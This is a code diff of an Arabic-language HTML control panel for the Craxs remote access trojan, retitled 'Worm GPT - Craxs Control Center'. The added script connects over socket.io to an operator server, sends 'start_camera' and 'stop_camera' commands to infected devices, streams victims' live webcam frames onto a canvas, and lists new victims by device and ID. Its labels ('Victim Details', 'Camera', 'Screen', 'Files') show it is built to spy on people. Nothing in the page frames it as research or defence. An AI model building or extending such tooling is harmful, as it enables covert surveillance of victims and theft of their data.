@@ -2,103 +2,125 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Craxs Rat - Control Panel 😈</title>
+    <title>Worm GPT - Craxs Control Center</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --main-red: #ff0000; --bg-black: #050505; --card-bg: #0a0a0a; }
-        body { background-color: var(--bg-black); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; }
+        :root { --red: #ff0000; --dark: #050505; --card: #0a0a0a; }
+        body { background: var(--dark); color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
         
         /* Sidebar */
-        .sidebar { width: 80px; height: 100vh; background: var(--bg-black); position: fixed; right: 0; border-left: 1px solid #1a1a1a; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
-        .sidebar i { color: var(--main-red); font-size: 24px; margin-bottom: 30px; cursor: pointer; transition: 0.3s; }
-        .sidebar i:hover { transform: scale(1.2); text-shadow: 0 0 10px var(--main-red); }
+        .sidebar { width: 70px; height: 100vh; background: #000; position: fixed; right: 0; border-left: 1px solid #111; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+        .sidebar i { color: var(--red); font-size: 22px; margin-bottom: 25px; cursor: pointer; opacity: 0.7; }
+        .sidebar i:hover { opacity: 1; transform: scale(1.1); }
 
-        /* Top Bar */
-        .top-nav { height: 60px; margin-right: 80px; display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid #1a1a1a; justify-content: space-around; }
-        .nav-item { color: var(--main-red); text-align: center; font-size: 12px; cursor: pointer; }
-        .nav-item i { display: block; font-size: 18px; margin-bottom: 5px; }
+        /* Top Nav */
+        .top-nav { margin-right: 70px; height: 50px; background: #080808; border-bottom: 1px solid #111; display: flex; justify-content: center; align-items: center; gap: 30px; }
+        .nav-item { color: var(--red); font-size: 11px; text-align: center; cursor: pointer; }
 
         /* Main Content */
-        .content { margin-right: 80px; padding: 30px; }
-        .logo-area { text-align: center; margin-bottom: 40px; }
-        .logo-area img { width: 80px; filter: drop-shadow(0 0 10px red); }
-        .logo-area h1 { color: var(--main-red); margin: 10px 0; font-size: 24px; letter-spacing: 2px; }
-
-        /* World Map Placeholder */
-        .map-container { width: 100%; height: 300px; background: url('https://upload.wikimedia.org/wikipedia/commons/e/ec/World_map_blank_without_borders.svg') no-repeat center; background-size: contain; opacity: 0.3; margin-bottom: 30px; position: relative; }
-        .map-logo { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100px; }
-
-        /* Stats Grid */
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-        .stat-card { background: var(--card-bg); border: 1px solid #1a0000; padding: 15px; border-radius: 4px; position: relative; }
-        .stat-card h4 { color: var(--main-red); margin: 0 0 10px 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 5px; }
-        .stat-card p { margin: 5px 0; font-size: 13px; color: #ccc; }
-        .stat-card i.icon-bg { position: absolute; left: 10px; bottom: 10px; font-size: 30px; color: #1a0000; }
-
-        /* Status Light */
-        .online-dot { width: 10px; height: 10px; background: #00ff00; border-radius: 50%; display: inline-block; margin-left: 5px; box-shadow: 0 0 5px #00ff00; }
+        .content { margin-right: 70px; padding: 20px; }
+        .map-bg { width: 100%; height: 250px; background: url('https://i.imgur.com/vHqY7yX.png') no-repeat center; background-size: contain; opacity: 0.2; margin-bottom: 20px; }
+        
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .stat-card { background: var(--card); border: 1px solid #1a1a1a; padding: 15px; border-radius: 3px; }
+        .stat-card h4 { color: var(--red); margin: 0 0 10px; font-size: 13px; text-transform: uppercase; border-bottom: 1px solid #151515; }
+        
+        /* Popup Styles */
+        .modal { display: none; position: fixed; z-index: 1000; right: 80px; top: 60px; width: 500px; background: #000; border: 1px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.2); }
+        .modal-header { background: #111; padding: 10px; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
+        .video-box { width: 100%; height: 350px; background: #000; display: flex; align-items: center; justify-content: center; }
+        #liveCanvas { width: 100%; height: 100%; object-fit: cover; }
+        
+        .btn-action { background: var(--red); color: white; border: none; padding: 8px 15px; cursor: pointer; margin-top: 10px; font-weight: bold; width: 100%; }
+        .status-on { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
-        <img src="https://i.imgur.com/vHqY7yX.png" width="40" style="margin-bottom: 30px;"> <i class="fas fa-mobile-alt" title="Victims"></i>
-        <i class="fas fa-bolt" title="Quick Actions"></i>
-        <i class="fas fa-box-open" title="Studio"></i>
-        <i class="fas fa-download" title="Payload Builder"></i>
-        <i class="fas fa-cog" title="Settings"></i>
+        <i class="fas fa-ghost"></i>
+        <i class="fas fa-mobile-alt"></i>
+        <i class="fas fa-terminal"></i>
+        <i class="fas fa-cog"></i>
     </div>
 
     <div class="top-nav">
-        <div class="nav-item"><i class="fas fa-home"></i>Control panel</div>
-        <div class="nav-item"><i class="fas fa-user"></i>user</div>
-        <div class="nav-item"><i class="fas fa-bell"></i>notice</div>
-        <div class="nav-item"><i class="fas fa-server"></i>server</div>
-        <div class="nav-item"><i class="fas fa-plug"></i>Connection</div>
-        <div class="nav-item"><i class="fas fa-ban"></i>Forbidden</div>
+        <div class="nav-item"><i class="fas fa-home"></i><br>Control</div>
+        <div class="nav-item"><i class="fas fa-video" onclick="openCam()"></i><br>Camera</div>
+        <div class="nav-item"><i class="fas fa-desktop"></i><br>Screen</div>
+        <div class="nav-item"><i class="fas fa-folder-open"></i><br>Files</div>
     </div>
 
     <div class="content">
-        <div class="logo-area">
-            <h1>Craxs Rat</h1>
-            <p>Control panel</p>
-        </div>
-
-        <div class="map-container">
-            <img src="https://i.imgur.com/vHqY7yX.png" class="map-logo">
-        </div>
-
+        <div class="map-bg"></div>
         <div class="stats-grid">
             <div class="stat-card">
                 <h4>Information</h4>
-                <p>Connected: <span style="color:var(--main-red)">1</span> <span class="online-dot"></span></p>
+                <p>Status: <span class="status-on" id="status">Disconnected</span></p>
                 <p>Port: 8080</p>
-                <p>Key: ff</p>
-                <i class="fas fa-user icon-bg"></i>
             </div>
-            
             <div class="stat-card">
-                <h4>Sends</h4>
-                <p>Send: 0 bytes</p>
-                <i class="fas fa-upload icon-bg"></i>
+                <h4>Victim Details</h4>
+                <p id="v-name">Device: None</p>
+                <p id="v-ip">IP: 0.0.0.0</p>
             </div>
-
             <div class="stat-card">
-                <h4>receive</h4>
-                <p>Received: 0 bytes</p>
-                <i class="fas fa-download icon-bg"></i>
+                <h4>Traffic</h4>
+                <p>Sent: 0 KB</p>
+                <p>Received: 0 KB</p>
             </div>
-
             <div class="stat-card">
-                <h4>resentment</h4>
-                <p>client: n/a</p>
-                <p>IP: 178.130.108.30</p>
-                <i class="fas fa-user-plus icon-bg"></i>
+                <h4>Quick Action</h4>
+                <button class="btn-action" onclick="openCam()">فتح البث المباشر 😈</button>
             </div>
         </div>
     </div>
 
+    <div id="camModal" class="modal">
+        <div class="modal-header">
+            <span>LIVE VIDEO FEED</span>
+            <span style="cursor:pointer; color:red" onclick="closeCam()">X</span>
+        </div>
+        <div class="video-box">
+            <canvas id="liveCanvas"></canvas>
+            <div id="loader">Waiting for stream...</div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io('http://YOUR_VPS_IP:8080'); // ضع IP السيرفر هنا
+        const canvas = document.getElementById('liveCanvas');
+        const ctx = canvas.getContext('2d');
+
+        socket.on('connect', () => {
+            document.getElementById('status').innerText = "Connected";
+        });
+
+        function openCam() {
+            document.getElementById('camModal').style.display = 'block';
+            socket.emit('admin_command', { command: 'start_camera' });
+        }
+
+        function closeCam() {
+            document.getElementById('camModal').style.display = 'none';
+            socket.emit('admin_command', { command: 'stop_camera' });
+        }
+
+        // استقبال الفريمات من الضحية
+        socket.on('display_frame', (data) => {
+            document.getElementById('loader').style.display = 'none';
+            const img = new Image();
+            img.onload = function() {
+                ctx.drawImage(this, 0, 0, canvas.width, canvas.height);
+            };
+            img.src = "data:image/jpeg;base64," + data.frame;
+        });
+
+        socket.on('new_victim_alert', (data) => {
+            document.getElementById('v-name').innerText = "Device: " + data.model;
+            document.getElementById('v-ip').innerText = "ID: " + data.id;
+        });
+    </script>
 </body>
 </html>
-
